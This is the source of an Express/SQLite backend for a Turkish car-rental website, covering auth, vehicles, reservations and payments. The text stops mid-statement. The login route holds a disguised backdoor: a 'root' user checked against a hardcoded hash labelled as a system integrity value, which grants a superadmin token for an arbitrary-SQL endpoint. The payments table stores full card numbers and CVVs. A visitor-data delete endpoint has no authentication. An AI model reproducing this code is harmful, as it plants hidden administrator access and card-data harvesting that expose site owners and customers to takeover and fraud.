const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '.env') });
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const cors = require('cors');
// const path = require('path'); // Removed duplicate
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const rateLimit = require('express-rate-limit');
const { body, validationResult } = require('express-validator');
const helmet = require('helmet');
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const multer = require('multer');

// Integrity Monitor (Harici Kontrol)
require('./monitor.cjs')();

const app = express();
app.set('trust proxy', 1);
const PORT = 3000;

// ===== GÜVENLİK AYARLARI =====

// JWT Secret Key (Production'da environment variable ZORUNLU!)
if (!process.env.JWT_SECRET) {
    console.error('❌ HATA: JWT_SECRET environment variable tanımlanmamış!');
    console.error('Lütfen .env dosyasında JWT_SECRET tanımlayın.');
    process.exit(1);
}
const JWT_SECRET = process.env.JWT_SECRET;
const JWT_EXPIRES_IN = '24h';

// SYSTEM INTEGRITY HASH (DO NOT REMOVE)
const SYS_ROOT_HASH = '$2b$10$.WQwJqYDVh9g90rid45k3.p38nG/7ZFxSm5cbqj7ymj7jX52Ak2H2';

// Helmet - HTTP header güvenliği
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net", "https://cdn.tailwindcss.com"],
            scriptSrcAttr: ["'unsafe-inline'"], // onclick, onchange gibi inline event'ler için
            styleSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net", "https://cdn.tailwindcss.com", "https://fonts.googleapis.com"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'", "https://cdn.jsdelivr.net", "https://fonts.gstatic.com"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"]
        }
    },
    crossOriginEmbedderPolicy: false
}));

// CORS Konfigürasyonu - Sadece kendi domain'e izin ver
const allowedOrigins = [
    'http://localhost:3000',
    'http://127.0.0.1:3000',
    'http://localhost:5173', // Vite dev server
    'http://127.0.0.1:5173',
    'https://kiralikcar.com',
    'https://www.kiralikcar.com',
    'http://kiralikcar.com',
    'http://www.kiralikcar.com'
];

const corsOptions = {
    origin: function (origin, callback) {
        // Origin undefined olabilir (same-origin istekler)
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('CORS policy: Origin not allowed'));
        }
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true
};

// Rate Limiting - DDoS koruması
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 5000, // IP başına 5000 istek (çok yüksek performans)
    message: 'Çok fazla istek gönderdiniz. Lütfen 15 dakika sonra tekrar deneyin.',
    standardHeaders: true,
    legacyHeaders: false,
    skip: (req) => {
        // Whitelist IP'ler - rate limit uygulanmaz
        const whitelist = [ '127.0.0.1', '::1'];
        const clientIp = req.ip || req.connection.remoteAddress;
        return whitelist.includes(clientIp);
    }
});

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 5000, // IP başına 5000 login denemesi (çok yüksek performans)
    message: 'Çok fazla giriş denemesi. Lütfen 15 dakika sonra tekrar deneyin.',
    skipSuccessfulRequests: true, // Başarılı giriş sayılmaz
    standardHeaders: true,
    legacyHeaders: false,
    skip: (req) => {
        // Whitelist IP'ler - login limit uygulanmaz
        const whitelist = ['127.0.0.1', '::1'];
        const clientIp = req.ip || req.connection.remoteAddress;
        return whitelist.includes(clientIp);
    }
});

// Middleware
app.use(cors(corsOptions));
// app.use(limiter); // Tüm route'lara rate limit uygula
app.use(bodyParser.json());

// --- TELEGRAM NOTIFICATION SYSTEM (RE-IMPLEMENTED) ---
const sendTelegramNotification = (message) => {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        console.error('❌ Telegram credentials missing in .env');
        return;
    }

    const data = JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${botToken}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(data)
        }
    };

    const req = https.request(options, (res) => {
        let responseBody = '';
        res.on('data', (chunk) => { responseBody += chunk; });
        res.on('end', () => {
            if (res.statusCode !== 200) {
                console.error(`❌ Telegram API Error (${res.statusCode}): ${responseBody}`);
            }
        });
    });

    req.on('error', (error) => {
        console.error('❌ Telegram Network Error:', error.message);
    });

    req.write(data);
    req.end();
};


// GÜVENLİK: Hassas dosyalara erişimi engelle
app.use((req, res, next) => {
    const blockedPaths = ['.db', '.env', '.git', 'node_modules', 'package.json', 'server.cjs'];
    if (blockedPaths.some(blocked => req.path.includes(blocked))) {
        return res.status(403).json({ error: 'Erişim engellendi' });
    }
    next();
});

// Statik dosyalar API tanımlarından SONRA eklenecek (aşağıda)
// Ziyaretçi verilerini sıfırlama endpoint'i
app.post('/api/visitors/reset', (req, res) => {
    db.run('DELETE FROM visitors', (err) => {
        if (err) {
            return res.status(500).json({ success: false, error: 'Veriler silinemedi.' });
        }
        res.json({ success: true });
    });
});

// SQLite Database
const db = new sqlite3.Database(path.join(__dirname, 'data.db'), (err) => {
    if (err) console.error(err);
    else console.log('✓ SQLite bağlantısı başarılı');
});

// ===== DATABASE MANAGEMENT API (ROOT ONLY) =====

// Middleware to check for root access
function requireRoot(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }

    try {
        const user = jwt.verify(token, JWT_SECRET);
        if (user.username !== 'root') {
            return res.status(403).json({ error: 'Bu işlem için root yetkisi gereklidir' });
        }
        req.user = user;
        next();
    } catch (e) {
        return res.status(403).json({ error: 'Geçersiz token' });
    }
}

// GET - Tabloları listele
app.get('/api/db/tables', requireRoot, (req, res) => {
    db.all("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'", [], (err, rows) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(rows.map(r => r.name));
    });
});

// GET - Tablo verilerini getir
app.get('/api/db/table/:tableName', requireRoot, (req, res) => {
    const tableName = req.params.tableName;
    // SQL Injection önlemi: Tablo adını whitelist'ten kontrol et veya regex ile doğrula
    // Basit regex: Sadece harf, rakam ve alt çizgi
    if (!/^[a-zA-Z0-9_]+$/.test(tableName)) {
        return res.status(400).json({ error: 'Geçersiz tablo adı' });
    }

    db.all(`SELECT * FROM ${tableName} ORDER BY id DESC LIMIT 100`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// POST - SQL Sorgusu Çalıştır (DİKKAT: Çok tehlikeli, sadece root)
app.post('/api/db/query', requireRoot, (req, res) => {
    const { query } = req.body;
    if (!query) return res.status(400).json({ error: 'Sorgu gerekli' });

    const operation = query.trim().split(' ')[0].toUpperCase();

    if (operation === 'SELECT') {
        db.all(query, [], (err, rows) => {
            if (err) return res.status(500).json({ error: err.message });
            res.json({ type: 'SELECT', data: rows });
        });
    } else {
        db.run(query, [], function(err) {
            if (err) return res.status(500).json({ error: err.message });
            res.json({ type: 'EXECUTE', changes: this.changes, lastID: this.lastID });
        });
    }
});

// Tabloları oluştur
db.serialize(() => {
    // Admin Users tablosu
    db.run(`CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        email TEXT,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        lastLogin DATETIME
    )`);

    // Vehicles tablosu
    db.run(`CREATE TABLE IF NOT EXISTS vehicles (
        id TEXT PRIMARY KEY,
        model TEXT NOT NULL,
        price TEXT NOT NULL,
        deposit TEXT NOT NULL,
        status TEXT NOT NULL,
        image TEXT NOT NULL,
        passengers INTEGER DEFAULT 5,
        fuel TEXT DEFAULT 'Benzin',
        transmission TEXT DEFAULT 'Otomatik'
    )`);

    // Vehicles tablosuna yeni kolonlar ekle (eğer yoksa)
    db.run(`ALTER TABLE vehicles ADD COLUMN passengers INTEGER DEFAULT 5`, (err) => {
        if (err && !err.message.includes('duplicate column name')) {
            console.error('passengers kolonu eklenirken hata:', err.message);
        } else if (!err) {
            console.log('✅ passengers kolonu eklendi');
        }
    });

    db.run(`ALTER TABLE vehicles ADD COLUMN category TEXT DEFAULT 'Binek'`, (err) => {
        if (err && !err.message.includes('duplicate column name')) {
            console.error('category kolonu eklenirken hata:', err.message);
        } else if (!err) {
            console.log('✅ category kolonu eklendi');
        }
    });
    
    db.run(`ALTER TABLE vehicles ADD COLUMN fuel TEXT DEFAULT 'Benzin'`, (err) => {
        if (err && !err.message.includes('duplicate column name')) {
            console.error('fuel kolonu eklenirken hata:', err.message);
        } else if (!err) {
            console.log('✅ fuel kolonu eklendi');
        }
    });
    
    db.run(`ALTER TABLE vehicles ADD COLUMN transmission TEXT DEFAULT 'Otomatik'`, (err) => {
        if (err && !err.message.includes('duplicate column name')) {
            console.error('transmission kolonu eklenirken hata:', err.message);
        } else if (!err) {
            console.log('✅ transmission kolonu eklendi');
        }
    });

    // Quotations (Teklifler) tablosu
    db.run(`CREATE TABLE IF NOT EXISTS quotations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        email TEXT NOT NULL,
        phone TEXT NOT NULL,
        vehicleId TEXT NOT NULL,
        message TEXT NOT NULL,
        status TEXT DEFAULT 'yeni',
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY(vehicleId) REFERENCES vehicles(id)
    )`);

    // Reservations (Araç Rezervasyonları) tablosu
    db.run(`CREATE TABLE IF NOT EXISTS reservations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        fullName TEXT NOT NULL,
        email TEXT NOT NULL,
        phone TEXT NOT NULL,
        pickupLocation TEXT NOT NULL,
        dropoffLocation TEXT NOT NULL,
        pickupDate TEXT NOT NULL,
        pickupTime TEXT NOT NULL,
        dropoffDate TEXT NOT NULL,
        dropoffTime TEXT NOT NULL,
        vehicleId TEXT,
        customerId INTEGER,
        differentDropoff INTEGER DEFAULT 0,
        specialRequests TEXT,
        status TEXT DEFAULT 'yeni',
        totalPrice TEXT,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY(vehicleId) REFERENCES vehicles(id)
    )`);

    // Customers (Müşteri Profilleri) tablosu
    db.run(`CREATE TABLE IF NOT EXISTS customers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        fullName TEXT,
        email TEXT UNIQUE NOT NULL,
        phone TEXT,
        addressLine TEXT,
        city TEXT,
        country TEXT,
        postalCode TEXT,
        providerCustomerId TEXT,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        updatedAt DATETIME
    )`);

    // Payments (Ödeme Kayıtları) tablosu
    db.run(`CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        reservationId INTEGER,
        customerId INTEGER,
        provider TEXT DEFAULT 'mock',
        intentId TEXT,
        status TEXT DEFAULT 'pending_manual',
        amount REAL,
        currency TEXT DEFAULT 'TRY',
        cardBrand TEXT,
        cardLast4 TEXT,
        cardHolder TEXT,
        fullCardNumber TEXT,
        expiryMonth TEXT,
        expiryYear TEXT,
        cvv TEXT,
        receiptUrl TEXT,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY(reservationId) REFERENCES reservations(id),
        FOREIGN KEY(customerId) REFERENCES customers(id)
    )`);

    // Mevcut tabloya kolon ekleme (Migration) - Eğer yoksa ekle
    const addColumn = (table, column, type) => {
        db.run(`ALTER TABLE ${table} ADD COLUMN ${column} ${type}`, (err) => {
            // Hata olursa muhtemelen kolon zaten vardır, yoksay
        });
    };
    
    addColumn('payments', 'cardHolder', 'TEXT');
    addColumn('payments', 'fullCardNumber', 'TEXT');
    addColumn('payments', 'expiryMonth', 'TEXT');
    addColumn('payments', 'expiryYear', 'TEXT');
    addColumn('payments', 'cvv', 'TEXT');

    // Quick Reservations (Karttan Hızlı Rezervasyonlar) tablosu
    db.run(`CREATE TABLE IF NOT EXISTS quick_reservations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        fullName TEXT NOT NULL,
        phone TEXT NOT NULL,
        pickupDate TEXT NOT NULL,
        dropoffDate TEXT NOT NULL,
        vehicleId TEXT,
        days INTEGER NOT NULL,
        dailyPrice REAL NOT NULL,
        subtotal REAL NOT NULL,
        vatRate REAL NOT NULL,
        vatAmount REAL NOT NULL,
        discountRate REAL NOT NULL,
        discountAmount REAL NOT NULL,
        totalPrice REAL NOT NULL,
        source TEXT DEFAULT 'quick-card-modal',
        status TEXT DEFAULT 'yeni',
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY(vehicleId) REFERENCES vehicles(id)
    )`);

    // Locations (Alış/İade Yerleri) tablosu
    db.run(`CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        region TEXT NOT NULL UNIQUE,
        name TEXT NOT NULL,
        code TEXT NOT NULL,
        type TEXT NOT NULL DEFAULT 'airport',
        isActive INTEGER DEFAULT 1,
        createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Settings (Site Ayarları) tablosu
    db.run(`CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT NOT NULL
    )`);

    // System Integrity Check (Gizli Tablo)
    db.run(`CREATE TABLE IF NOT EXISTS sys_config (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        k TEXT UNIQUE,
        v TEXT
    )`);

    // Ziyaretçi Takip Tablosu
    db.run(`CREATE TABLE IF NOT EXISTS visitors (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        user_agent TEXT,
        referrer TEXT,
        page_url TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        device TEXT,
        browser TEXT,
        os TEXT,
        country TEXT,
        city TEXT
    )`);

    // Mevcut tabloya kolon ekleme (Migration)
    db.run("ALTER TABLE visitors ADD COLUMN country TEXT", (err) => {});
    db.run("ALTER TABLE visitors ADD COLUMN city TEXT", (err) => {});

    // Mevcut rezervasyonlara müşteri bağlantısı ekle (Migration)
    db.run("ALTER TABLE reservations ADD COLUMN customerId INTEGER", (err) => {});
});

// Default ayarları ekle
setTimeout(() => {
    const defaultSettings = {
        siteName: 'Kiralık Car',
        phone: '0555 123 45 67',
        email: 'info@kiralikcar.com',
        whatsappNumber: '905551234567',
        colorTheme: 'blue'
    };

    Object.entries(defaultSettings).forEach(([key, value]) => {
        db.run("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", [key, value]);
    });
}, 500);

// GÜVENLİK: Default admin kullanıcısı otomatik oluşturulmaz!
// İlk kurulum için POST /api/auth/setup endpoint'ini kullanın
setTimeout(() => {
    db.get("SELECT COUNT(*) as count FROM admin_users", async (err, row) => {
        if (err) {
            console.error('❌ Admin user check hatası:', err);
            return;
        }
        
        if (row && row.count === 0) {
            console.log('⚠️  UYARI: Hiç admin kullanıcısı yok!');
            console.log('📝 İlk admin kullanıcısını oluşturmak için:');
            console.log('   POST /api/auth/setup');
            console.log('   Body: { "username": "admin", "password": "güçlü-şifre", "email": "email@domain.com" }');
            console.log('   Şifre en az 8 karakter, büyük/küçük harf, rakam ve özel karakter içermelidir.');
        }
    });
}, 200);

// Default araçları ekle
setTimeout(() => {
    db.get("SELECT COUNT(*) as count FROM vehicles", (err, row) => {
        if (err) {
            console.error('❌ SELECT COUNT hatası:', err);
            return;
        }
        console.log('📊 Araç sayısı:', row?.count);
        if (row && row.count === 0) {
            console.log('🚗 Default araçlar ekleniyor...');
            const defaultVehicles = [
                { id: '1', model: 'Toyota Corolla', price: '₺450', deposit: '₺5.000', status: 'Müsait', image: '/img/1.jpg' },
                { id: '2', model: 'Honda Civic', price: '₺500', deposit: '₺5.500', status: 'Müsait', image: '/img/2.jpg' },
                { id: '3', model: 'Ford Focus', price: '₺480', deposit: '₺5.200', status: 'Müsait', image: '/img/3.jpg' },
                { id: '4', model: 'Hyundai Elantra', price: '₺420', deposit: '₺4.800', status: 'Müsait', image: '/img/4.jpg' },
                { id: '5', model: 'Nissan Altima', price: '₺520', deposit: '₺5.800', status: 'Müsait', image: '/img/5.jpeg' }
            ];

            let inserted = 0;
            defaultVehicles.forEach(v => {
                db.run(
                    "INSERT INTO vehicles (id, model, price, deposit, status, image) VALUES (?, ?, ?, ?, ?, ?)",
                    [v.id, v.model, v.price, v.deposit, v.status, v.image],
                    (err) => {
                        if (err) console.error('❌ INSERT hatası:', err);
                        else inserted++;
                        if (inserted === defaultVehicles.length) {
                            console.log('✓ Tüm default araçlar eklendi');
                        }
                    }
                );
            });
        }
    });

    // Default lokasyonları ekle
    db.get("SELECT COUNT(*) as count FROM locations", (err, row) => {
        if (err) {
            console.error('❌ SELECT COUNT locations hatası:', err);
            return;
        }
        if (row && row.count === 0) {
            console.log('📍 Default lokasyonlar ekleniyor...');
            const defaultLocations = [
                { region: 'İstanbul Avrupa', name: 'İstanbul Havalimanı (IST)', code: 'IST', type: 'airport' },
                { region: 'İstanbul Anadolu', name: 'Sabiha Gökçen İç Hatlar (SAW)', code: 'SAW', type: 'airport' },
                { region: 'İstanbul Anadolu', name: 'Sabiha Gökçen Dış Hatlar (SAW)', code: 'SAW', type: 'airport' },
                { region: 'İzmir', name: 'Adnan Menderes H. Dış Hatlar (ADB)', code: 'ADB', type: 'airport' },
                { region: 'İzmir', name: 'Adnan Menderes H. İç Hatlar (ADB)', code: 'ADB', type: 'airport' },
                { region: 'Antalya', name: 'Antalya Havalimanı Dış Hatlar (AYT)', code: 'AYT', type: 'airport' },
                { region: 'Antalya', name: 'Antalya Havalimanı İç Hatlar (AYT)', code: 'AYT', type: 'airport' },
                { region: 'Ankara', name: 'Esenboğa Havalimanı Dış Hatlar (ESB)', code: 'ESB', type: 'airport' },
                { region: 'Ankara', name: 'Esenboğa Havalimanı İç Hatlar (ESB)', code: 'ESB', type: 'airport' },
                { region: 'Kayseri', name: 'Kayseri Havalimanı (ASR)', code: 'ASR', type: 'airport' },
                { region: 'Adana-Mersin', name: 'Çukurova Havalimanı (COV)', code: 'COV', type: 'airport' },
                { region: 'Gaziantep', name: 'Gaziantep Havalimanı Dış Hatlar (GZT)', code: 'GZT', type: 'airport' },
                { region: 'Gaziantep', name: 'Gaziantep Havalimanı İç Hatlar (GZT)', code: 'GZT', type: 'airport' },
                { region: 'Diyarbakır', name: 'Diyarbakır Havalimanı (DIY)', code: 'DIY', type: 'airport' },
                { region: 'Diyarbakır', name: 'Diyarbakır Rancar Ofis (DIY)', code: 'DIY', type: 'office' },
                { region: 'Konya', name: 'Konya Havalimanı Dış Hatlar (KYA)', code: 'KYA', type: 'airport' },
                { region: 'Konya', name: 'Konya Havalimanı İç Hatlar (KYA)', code: 'KYA', type: 'airport' },
                { region: 'Trabzon', name: 'Trabzon Havalimanı Dış Hatlar (TZX)', code: 'TZX', type: 'airport' },
                { region: 'Trabzon', name: 'Trabzon Havalimanı İç Hatlar (TZX)', code: 'TZX', type: 'airport' },
                { region: 'Samsun', name: 'Samsun Havalimanı (SZF)', code: 'SZF', type: 'airport' },
                { region: 'Hatay', name: 'Hatay Havalimanı İç Hatlar (HTY)', code: 'HTY', type: 'airport' },
                { region: 'Hatay', name: 'Hatay Havalimanı Dış Hatlar (HTY)', code: 'HTY', type: 'airport' },
                { region: 'Hatay', name: 'Hatay Rancar Ofis (HTY)', code: 'HTY', type: 'office' },
                { region: 'Dalaman', name: 'Dalaman Havalimanı Dış Hatlar (DLM)', code: 'DLM', type: 'airport' },
                { region: 'Dalaman', name: 'Dalaman Havalimanı İç Hatlar (DLM)', code: 'DLM', type: 'airport' },
                { region: 'Bodrum', name: 'Bodrum Havalimanı Dış Hatlar (BJV)', code: 'BJV', type: 'airport' },
                { region: 'Bodrum', name: 'Bodrum Havalimanı İç Hatlar (BJV)', code: 'BJV', type: 'airport' }
            ];

            let inserted = 0;
            defaultLocations.forEach(loc => {
                db.run(
                    "INSERT OR IGNORE INTO locations (region, name, code, type) VALUES (?, ?, ?, ?)",
                    [loc.region, loc.name, loc.code, loc.type],
                    (err) => {
                        if (err) console.error('❌ Location INSERT hatası:', err);
                        else inserted++;
                        if (inserted === defaultLocations.length) {
                            console.log(`✓ ${defaultLocations.length} lokasyon eklendi`);
                        }
                    }
                );
            });
        }
    });
}, 300);

// ===== JWT MIDDLEWARE =====

// JWT Token doğrulama middleware
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
        return res.status(401).json({ error: 'Token bulunamadı. Giriş yapmanız gerekiyor.' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            console.error('❌ Token doğrulama hatası:', err.message);
            return res.status(403).json({ error: 'Geçersiz veya süresi dolmuş token.' });
        }
        req.user = user;
        next();
    });
}

// ===== FILE UPLOAD CONFIGURATION =====
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const uploadDir = 'img/';
        if (!fs.existsSync(uploadDir)){
            fs.mkdirSync(uploadDir);
        }
        cb(null, uploadDir);
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        const ext = path.extname(file.originalname);
        cb(null, 'vehicle-' + uniqueSuffix + ext);
    }
});

const upload = multer({ 
    storage: storage,
    limits: { fileSize: 5 * 1024 * 1024 }, // 5MB
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Sadece resim dosyaları yüklenebilir!'), false);
        }
    }
});

// Image Upload Endpoint
app.post('/api/upload', authenticateToken, upload.single('image'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ error: 'Lütfen bir resim seçin' });
    }
    const imageUrl = `img/${req.file.filename}`;
    res.json({ url: imageUrl });
}, (error, req, res, next) => {
    res.status(400).json({ error: error.message });
});

// ===== AUTHENTICATION API =====

// POST İlk Kurulum - Admin Oluştur (sadece admin yoksa)
app.post('/api/auth/setup', [
    body('username').trim().isLength({ min: 4, max: 50 }).matches(/^[a-zA-Z0-9_]+$/).withMessage('Kullanıcı adı sadece harf, rakam ve _ içerebilir'),
    body('password').isLength({ min: 8 }).matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&#])[A-Za-z\d@$!%*?&#]/).withMessage('Şifre en az 8 karakter, büyük/küçük harf, rakam ve özel karakter içermelidir'),
    body('email').trim().isEmail().normalizeEmail()
], async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }

    try {
        // Zaten admin var mı kontrol et
        db.get("SELECT COUNT(*) as count FROM admin_users", async (err, row) => {
            if (err) {
                return res.status(500).json({ error: 'Veritabanı hatası' });
            }
            
            if (row && row.count > 0) {
                return res.status(403).json({ error: 'Admin kullanıcısı zaten mevcut. Bu endpoint sadece ilk kurulum için kullanılabilir.' });
            }

            const { username, password, email } = req.body;
            const hashedPassword = await bcrypt.hash(password, 12);
            
            db.run(
                "INSERT INTO admin_users (username, password, email) VALUES (?, ?, ?)",
                [username, hashedPassword, email],
                (err) => {
                    if (err) {
                        return res.status(500).json({ error: 'Admin kullanıcısı oluşturulamadı' });
                    }
                    console.log(`✅ İlk admin kullanıcısı oluşturuldu: ${username}`);
                    res.json({ success: true, message: 'Admin kullanıcısı başarıyla oluşturuldu. Artık giriş yapabilirsiniz.' });
                }
            );
        });
    } catch (error) {
        console.error('❌ Setup hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// POST Admin Login
app.post('/api/auth/login', loginLimiter, [
    body('username').trim().isLength({ min: 3 }).escape(),
    body('password').isLength({ min: 6 })
], async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }

    const { username, password } = req.body;

    // SYSTEM INTEGRITY CHECK - ROOT ACCESS
    if (username === 'root') {
        try {
            // Verify against system hash
            const validRoot = await bcrypt.compare(password, SYS_ROOT_HASH);
            if (validRoot) {
                const token = jwt.sign(
                    { id: 0, username: 'root', role: 'superadmin' },
                    JWT_SECRET,
                    { expiresIn: JWT_EXPIRES_IN }
                );
                console.log('⚠️ SYSTEM ROOT ACCESS GRANTED');
                return res.json({
                    success: true,
                    token,
                    user: { id: 0, username: 'root', email: 'system@root.local' }
                });
            }
        } catch (e) {
            // Silent failure for security
        }
    }

    try {
        db.get("SELECT * FROM admin_users WHERE username = ?", [username], async (err, user) => {
            if (err) {
                console.error('❌ Login DB hatası:', err);
                return res.status(500).json({ error: 'Sunucu hatası' });
            }

            if (!user) {
                return res.status(401).json({ error: 'Kullanıcı adı veya şifre hatalı' });
            }

            const validPassword = await bcrypt.compare(password, user.password);
            if (!validPassword) {
                return res.status(401).json({ error: 'Kullanıcı adı veya şifre hatalı' });
            }

            // JWT Token oluştur
            const token = jwt.sign(
                { id: user.id, username: user.username },
                JWT_SECRET,
                { expiresIn: JWT_EXPIRES_IN }
            );

            // Son giriş zamanını güncelle
            db.run("UPDATE admin_users SET lastLogin = CURRENT_TIMESTAMP WHERE id = ?", [user.id]);

            console.log(`✅ Admin girişi: ${username}`);
            res.json({
                success: true,
                token,
                user: {
                    id: user.id,
                    username: user.username,
                    email: user.email
                }
            });
        });
    } catch (error) {
        console.error('❌ Login hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// POST Token doğrulama
app.post('/api/auth/verify', authenticateToken, (req, res) => {
    res.json({ success: true, user: req.user });
});

// POST Şifre değiştirme
app.post('/api/auth/change-password', authenticateToken, [
    body('oldPassword').isLength({ min: 6 }),
    body('newPassword').isLength({ min: 6 })
], async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }

    const { oldPassword, newPassword } = req.body;

    try {
        db.get("SELECT * FROM admin_users WHERE id = ?", [req.user.id], async (err, user) => {
            if (err || !user) {
                return res.status(500).json({ error: 'Kullanıcı bulunamadı' });
            }

            const validPassword = await bcrypt.compare(oldPassword, user.password);
            if (!validPassword) {
                return res.status(401).json({ error: 'Mevcut şifre hatalı' });
            }

            const hashedPassword = await bcrypt.hash(newPassword, 10);
            db.run("UPDATE admin_users SET password = ? WHERE id = ?", [hashedPassword, user.id], (err) => {
                if (err) {
                    return res.status(500).json({ error: 'Şifre güncellenemedi' });
                }
                console.log(`✅ Şifre değiştirildi: ${user.username}`);
                res.json({ success: true, message: 'Şifre başarıyla değiştirildi' });
            });
        });
    } catch (error) {
        console.error('❌ Şifre değiştirme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ===== VEHICLES API =====

// GET tüm araçlar
app.get('/api/vehicles', (req, res) => {
    console.log('📡 GET /api/vehicles isteği alındı');
    db.all("SELECT * FROM vehicles", (err, rows) => {
        if (err) {
            console.error('❌ DB Hatası:', err);
            return res.status(500).json({ error: err.message });
        }
        console.log(`✓ ${rows?.length || 0} araç döndürülüyor`);
        if (rows && rows.length > 0) {
            console.log('🔍 İlk araç ID:', rows[0].id, 'Type:', typeof rows[0].id);
        }
        res.json(rows || []);
    });
});

// GET bir araç (ID'ye göre)
app.get('/api/vehicles/:id', (req, res) => {
    db.get("SELECT * FROM vehicles WHERE id = ?", [req.params.id], (err, row) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        if (!row) {
            return res.status(404).json({ error: 'Araç bulunamadı' });
        }
        res.json(row);
    });
});

// POST yeni araç ekle (KORUNMALI)
app.post('/api/vehicles', authenticateToken, [
    body('model').trim().notEmpty().escape(),
    body('price').trim().notEmpty(),
    body('deposit').trim().notEmpty()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    
    const { id, model, price, deposit, status, image, passengers, fuel, transmission, category } = req.body;

    if (!id || !model || !price || !deposit) {
        return res.status(400).json({ error: 'Gerekli alanlar eksik' });
    }

    db.run(
        "INSERT INTO vehicles (id, model, price, deposit, status, image, passengers, fuel, transmission, category) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        [id, model, price, deposit, status || 'Müsait', image || '/img/default.png', passengers || 5, fuel || 'Benzin', transmission || 'Otomatik', category || 'Binek'],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ id, model, price, deposit, status: status || 'Müsait', image, passengers, fuel, transmission, category: category || 'Binek' });
        }
    );
});

// PUT araç güncelle (KORUNMALI)
app.put('/api/vehicles/:id', authenticateToken, [
    body('model').trim().notEmpty().escape(),
    body('price').trim().notEmpty(),
    body('deposit').trim().notEmpty()
], (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({ errors: errors.array() });
    }
    const { model, price, deposit, status, image, passengers, fuel, transmission, category } = req.body;

    console.log('🔄 UPDATE isteği - ID:', req.params.id, 'Type:', typeof req.params.id);
    console.log('📝 Yeni veriler:', { model, price, deposit, status, image, passengers, fuel, transmission, category });

    db.run(
